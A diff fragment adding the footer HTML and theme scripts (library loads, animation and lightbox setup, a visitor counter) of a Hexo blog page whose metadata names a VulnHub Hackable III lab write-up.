+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub Hackable：III",
+          url: "https://suc2es2.github.io/2026/07/31/Hackable%20III/",
+          excerpt: "",
+          description: "",
+          stripContent: "Hackable：III项目地址：https://download.vulnhub.com/hackable/hackable3.ova 是一个打包好的镜像文件 注意：导入 ovf 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  CTFStegHide 隐写访问其 80 端口的源代码信息，在其源代码信息中发现提示信息，根据提示信息猜测可能存在以下账户 1234jubiscleudohackable3Jubiscleudo，请务必记得在离开你负责的区域时激活端口敲击",
+          date: "Fri Jul 31 2026 16:29:00 GMT+0800",
+          updated: "Wed Aug 05 2026 15:59:28 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
